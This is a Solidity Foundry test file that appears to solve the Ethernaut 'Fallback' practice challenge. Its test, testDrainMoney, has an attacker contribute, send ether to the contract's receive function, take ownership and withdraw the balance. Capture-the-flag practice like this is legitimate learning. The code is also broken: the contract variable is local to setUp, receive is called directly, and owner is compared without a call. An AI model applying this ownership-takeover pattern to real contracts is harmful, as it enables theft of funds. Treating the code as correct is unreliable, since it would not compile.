// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {deployScript} from "../script/Deploy.s.sol";
import {Fallback} from "../src/fallback.sol";

contract testing is Test{
    function setUp() public{
deployScript deployContract = new deployScript();
Fallback fally = deployContract.run();
    }

    function testDrainMoney() public{
        //Arrange
     for(int i= 1; i<3;i++){
            address player = address(uint160(i));
            vm.deal(player , 10 ether);
            fally.contribute{value:0.0001 ether}();
        }
        // act
address hacker = makeAddr("Saad");
        vm.startPrank(hacker);
        vm.deal(hacker,10 ether);
        fally.contribute{value:0.0001 ether}();
        fally.receive{value:2 ether}();
        fally.withdraw();


// assert
assert(fally.owner == hacker);
        
    }
}